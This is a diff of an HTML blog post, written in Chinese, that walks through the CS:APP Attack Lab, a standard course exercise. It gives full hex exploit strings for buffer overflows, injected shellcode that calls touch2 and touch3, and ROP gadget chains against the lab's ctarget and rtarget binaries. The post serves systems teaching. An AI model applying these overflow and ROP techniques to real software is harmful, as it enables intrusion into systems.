@@ -137,7 +137,7 @@
 <p><img alt="" src="../../migrated/post-images/1715783531349.png"/></p>
 <h2 id="相关指令">相关指令</h2>
 <p>这个lab不用打断点方便很多。</p>
-<div class="highlight"><pre><span></span><code>phase1, 2:
+<pre class="highlight"><code>phase1, 2:
 cat phaseX.txt | ./hex2raw | ./ctarget
 
 ./hex2raw &lt; phaseX.txt &gt; phaseX-raw.txt
@@ -146,27 +146,27 @@ run &lt; phaseX-raw.txt
 
 phase3, 4, 5:
 cat phaseX.txt | ./hex2raw | ./rtarget
-</code></pre></div>
+</code></pre>
 <p>末尾加 -q 是不发送到评测服务器。</p>
 <h2 id="phase5">phase5</h2>
 <p>我们要做的事情类似于phase3，如下：</p>
-<div class="highlight"><pre><span></span><code>0000000000000000 &lt;.text&gt;:
+<pre class="highlight"><code>0000000000000000 &lt;.text&gt;:
    0:   48 c7 c7 b8 00 64 55    mov    $0x556400b8,%rdi
    7:   68 92 18 40 00          pushq  $0x401892
    c:   c3                      retq   
-</code></pre></div>
+</code></pre>
 <p>此时我们要解决以下问题：</p>
 <ol>
 <li><code>0x556400b8</code> 本来是我们用于存放字符串的位置（执行的命令之后），但是我们现在此位置未知。
 首先类似于phase4，将我们所需注入的代码： <code>mov 字符串地址,%rdi</code> 和执行touch3拆解为：（伪代码）</li>
 </ol>
-<div class="highlight"><pre><span></span><code>`popq %rax` 对应地址
+<pre class="highlight"><code>`popq %rax` 对应地址
 此处存放所需字符串地址
 `movq %rax,%rdi` 对应地址
 touch3对应地址
-</code></pre></div>
+</code></pre>
 <p>那么接下来只要考虑如何获取到存放的字符串地址。分析farm发现：</p>
-<div class="highlight"><pre><span></span><code>0000000000401964 &lt;mid_farm&gt;:
+<pre class="highlight"><code>0000000000401964 &lt;mid_farm&gt;:
   401964:   b8 01 00 00 00          mov    $0x1,%eax
   401969:   c3                      ret    
 
@@ -305,11 +305,11 @@ touch3对应地址
 0000000000401a44 &lt;end_farm&gt;:
   401a44:   b8 01 00 00 00          mov    $0x1,%eax
   401a49:   c3                      ret    
-</code></pre></div>
+</code></pre>
 <p>gadget为我们提供了<code>add_xy</code>指令，区别于其他所有指令，可能会完整用到该指令。结合课本 <code>支持变长栈帧</code> 一节中提到的利用 <code>%rbp</code> 构造相对位置，而我们的 <code>%rsp</code> 的地址可以动态获取得到，考虑利用相对位置获取字符串的动态位置。
 那么我们目标就很明晰了：构造 add %rsp, 相对位移量。
 倒推得到我们需要将 <code>%rsp</code> 和 相对位移量 传给 <code>%rdi</code> 和 <code>%rsi</code> （或相反），结合我们挖到的其他指令：</p>
-<div class="highlight"><pre><span></span><code># # start_farm
+<pre class="highlight"><code># # start_farm
 # popq %rax
 # movq %rax,%rdi
 # movq %eax,%edi
@@ -321,14 +321,14 @@ touch3对应地址
 # movl %edx,%esi
 # movl %esp,%eax
 # # end_farm
-</code></pre></div>
+</code></pre>
 <p>发现可以做到
 <code>%rsp</code> → <code>%rax</code> → <code>%rdi</code>
 相对位移量 → <code>%rax</code> → <code>%ecx</code> → <code>%edx</code> → <code>%esi</code>
 这两条路径，从而满足我们的全部要求。
 （其中 <code># movl %eax,%ecx</code>是因为我们在直接找完其他指令之后发现需要有一条目标操作数D为<code>%edx</code>或<code>%ecx</code>或<code>%rdx</code>或<code>%rcx</code>，因此搜寻包含 <code>89 c1</code> 或 <code>89 c2</code> 且之后返回的指令。寻找发现这一条返回之前包含<code>nop</code>、但满足我们的要求。）
 构造伪代码指令如下：</p>
-<div class="highlight"><pre><span></span><code>(%rsp指向此处↓)
+<pre class="highlight"><code>(%rsp指向此处↓)
 地址: `movq %rsp,%rax` (0000000000401992)
 地址: `movq %rax,%rdi` (000000000040194c)
 地址: `popq %rax` (0000000000401933)
@@ -341,9 +341,9 @@ touch3对应地址
 地址: `movq %rax,%rdi` (000000000040194c)
 地址: touch3 (0000000000401892)
 值: 所需字符串 (33 36 36 31 61 39 39 34 00)
-</code></pre></div>
+</code></pre>
 <p>翻译如下：</p>
-<div class="highlight"><pre><span></span><code>90 90 90 90 90 90 90 90 90 90
+<pre class="highlight"><code>90 90 90 90 90 90 90 90 90 90
 90 90 90 90 90 90 90 90 90 90
 90 90 90 90 90 90 90 90 90 90
 90 90 90 90 90 90 90 90 90 90
@@ -358,20 +358,20 @@ ea 19 40 00 00 00 00 00
 4c 19 40 00 00 00 00 00
 92 18 40 00 00 00 00 00
 **33** 36 36 31 61 39 39 34 00
-</code></pre></div>
+</code></pre>
 <p>此处观察偏移量。
 我们知道<code>%rsp</code>一开始指向<code>movq %rsp,%rax</code>处（对应 <code>92 19 40 00 00 00 00 00</code> ），经过一次 <code>popq</code> 指令+8，左负右正，移动到了 <code>**4c** 19 40 00 00 00 00 00</code> 处，也就是说我们所需的是此处到我们所需字符串的相对偏移量。
 从<code>**4c**</code>处到<code>**33**</code>处为72个字节，从而获得偏移量为+0x48，填入<code>&lt; &gt;</code>位置即可。</p>
 <p><strong><em>恭喜皆传</em></strong>。</p>
 <h2 id="phase4">phase4</h2>
 <p>我们要做的事情类似于phase2，如下：</p>
-<div class="highlight"><pre><span></span><code>movq $0x3661a994,%rdi  # set the register
+<pre class="highlight"><code>movq $0x3661a994,%rdi  # set the register
 pushq 0x401781         # the address of touch2
 ret
-</code></pre></div>
+</code></pre>
 <p>但是，phase2中已知栈底在 <code>0x55640088</code> 处、从而可以直接从被替代的返回值处（也就是<code>%rsp</code>指向的位置）执行上述指令。但phase4未知栈底位置、且如此存入栈其他位置的代码无法执行，只能另做他法。
 首先分析 <code>start_farm</code> 到 <code>mid_farm</code> ：</p>
-<div class="highlight"><pre><span></span><code>0000000000401929 &lt;start_farm&gt;:
+<pre class="highlight"><code>0000000000401929 &lt;start_farm&gt;:
   401929:   b8 01 00 00 00          mov    $0x1,%eax
   40192e:   c3                      ret    
 
@@ -410,11 +410,11 @@ ret
 0000000000401964 &lt;mid_farm&gt;:
   401964:   b8 01 00 00 00          mov    $0x1,%eax
   401969:   c3                      ret    
-</code></pre></div>
+</code></pre>
 <p>注意我们所需“断章取义”的地址开始处与函数入口不同。
 从以上分析的指令寻找，发现 <code>movq $0x3661a994,%rdi</code>  可以拆作两步： <code>popq %rax</code>和 <code>movq %rax,%rdi</code>，其中将<code>$0x3661a994</code> 存在栈指针指向的位置。这样可以做到不知道栈底的位置、但执行相同的操作。
 基于这个思路，我们将所需执行的“断章取义”的代码（也就是"农场"里的那些地址）全部写在被替代的返回值处，包括如下操作：</p>
-<div class="highlight"><pre><span></span><code>90 90 90 90 90 90 90 90 90 90
+<pre class="highlight"><code>90 90 90 90 90 90 90 90 90 90
 90 90 90 90 90 90 90 90 90 90
 90 90 90 90 90 90 90 90 90 90
 90 90 90 90 90 90 90 90 90 90
@@ -431,23 +431,23 @@ ret
 
 (同样道理，利用地址执行touch2: 0000000000401781)
 81 17 40 00 00 00 00 00
-</code></pre></div>
+</code></pre>
 <p>简单总结，我们通过断章取义完成了第一套指令的拼凑，而实际上这个断章取义的过程也是函数调用的过程。</p>
 <h2 id="phase3">phase3</h2>
 <p>cookie: <code>3661a994</code>，注意到3对应于0x33，a对应于97即0x61（或A对应65），那么这八位的字符表示分别为</p>
-<div class="highlight"><pre><span></span><code>33 36 36 31 61 39 39 34 00
-</code></pre></div>
+<pre class="highlight"><code>33 36 36 31 61 39 39 34 00
+</code></pre>
 <p>最后的<code>00</code> 是字符串结尾。
 注意此处不是“小端法”，因为字符串理解为一系列字符、每个字符各自为一个值按顺序存放；而我们存放地址等时是对“同一个值”用多个字符，才需要小端。
 我们用类似于上一个phase的方法进行修改：
 下述的<code>0x401892</code> 是touch3的地址，<code>0x55640088</code> 是栈底（输入字符串的位置），我们存放字符串在加48即0x30的位置，它的地址为 <code>0x556400b8</code>。</p>
-<div class="highlight"><pre><span></span><code>0000000000000000 &lt;.text&gt;:
+<pre class="highlight"><code>0000000000000000 &lt;.text&gt;:
    0:   48 c7 c7 b8 00 64 55    mov    $0x556400b8,%rdi
    7:   68 92 18 40 00          pushq  $0x401892
    c:   c3                      retq   
-</code></pre></div>
-<div class="highlight"><pre><span></span><code>48 c7 c7 b8 00 64 55 68 92 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 88 00 64 55 00 00 00 00 33 36 36 31 61 39 39 34 00
-</code></pre></div>
+</code></pre>
+<pre class="highlight"><code>48 c7 c7 b8 00 64 55 68 92 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 88 00 64 55 00 00 00 00 33 36 36 31 61 39 39 34 00
+</code></pre>
 <p>有趣的是，如果我们将cookie字符串存放到大片的00处，由于调用touch3会额外有push和sub（add负值等同于sub）等对栈指针的操作（相减类似于向上述的往左覆盖），我们存放的cookie字符串会被覆盖。因此将cookie字符串存放在字符串末尾巧妙地防止了这一点。运气很好没碰到这个难点，直接解决了。</p>
 <h2 id="phase2">phase2</h2>
 <p>我们考虑的思路是分两步：</p>
@@ -459,34 +459,34 @@ ret
 为了执行touch2，我们可以利用类似于call指令的方法，即将“call指令的下一行”压入栈中、之后返回就会将栈中的地址弹出到PC，作为我们下一处执行的地址，从而将控制归还给touch2。
 基于以上思路，写出的汇编代码如下：</li>
 </ol>
-<div class="highlight"><pre><span></span><code>movq $0x3661a994,%rdi  # set the register
+<pre class="highlight"><code>movq $0x3661a994,%rdi  # set the register
 pushq 0x401781         # the address of touch2
 ret
-</code></pre></div>
+</code></pre>
 <p>对应于以下汇编代码：</p>
-<div class="highlight"><pre><span></span><code>0000000000000000 &lt;.text&gt;:
+<pre class="highlight"><code>0000000000000000 &lt;.text&gt;:
    0:   48 c7 c7 94 a9 61 36    mov    $0x3661a994,%rdi
    7:   68 81 17 40 00          pushq  $0x401781
    c:   c3                      retq   
-</code></pre></div>
+</code></pre>
 <p>而为了利用栈帧分配的40字节，我们就需要获取sub 0x28之后栈帧的地址，跳转到这个位置执行上述指令。
 为此，我们选择使用gdb在执行完sub 0x28之后的下一行打断点 <code>b *0x401743</code>，并读取寄存器的值，得到栈底地址 <code>%rsp = 0x55640088</code> 。</p>
 <p>从而我们按照与phase1相同的思路覆盖返回地址即可。最终得到的代码如下：</p>
-<div class="highlight"><pre><span></span><code>48 c7 c7 94 a9 61 36 68 81 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 88 00 64 55 00
-</code></pre></div>
+<pre class="highlight"><code>48 c7 c7 94 a9 61 36 68 81 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 88 00 64 55 00
+</code></pre>
 <h2 id="phase1">phase1</h2>
 <p><code>touch1</code> 的入口地址是 <code>0x401755</code>，
 考虑到<code>getbuf</code> 先在返回地址处往栈顶分配0x28=40字节的空间，输入值超过40字节即可冲掉返回地址（8字节），使“返回”变为执行我们的指令。所以考虑输入以下内容：</p>
-<div class="highlight"><pre><span></span><code>90 90 90 90 90 90 90 90 90 90
+<pre class="highlight"><code>90 90 90 90 90 90 90 90 90 90
 90 90 90 90 90 90 90 90 90 90
 90 90 90 90 90 90 90 90 90 90
 90 90 90 90 90 90 90 90 90 90
 55 17 40 00 00 00 00 00
-</code></pre></div>
+</code></pre>
 <p>其中90代表<code>nop</code>，但其实写别的也没关系，因为这40个字节用不到。</p>
 <p>之后执行以下指令：</p>
-<div class="highlight"><pre><span></span><code>cat phase1.txt | ./hex2raw | ./ctarget -q
-</code></pre></div>
+<pre class="highlight"><code>cat phase1.txt | ./hex2raw | ./ctarget -q
+</code></pre>
 <p>即可。</p>
 <aside class="post-rel is-series"><span class="post-rel-label">系列导航</span><div class="post-rel-items"><a class="post-rel-link" href="csapp-bomblab.html" title="上一篇">← Bomblab</a><a class="post-rel-link" href="csapp-cachelab.html" title="下一篇">Cachelab →</a></div></aside>
   </div>
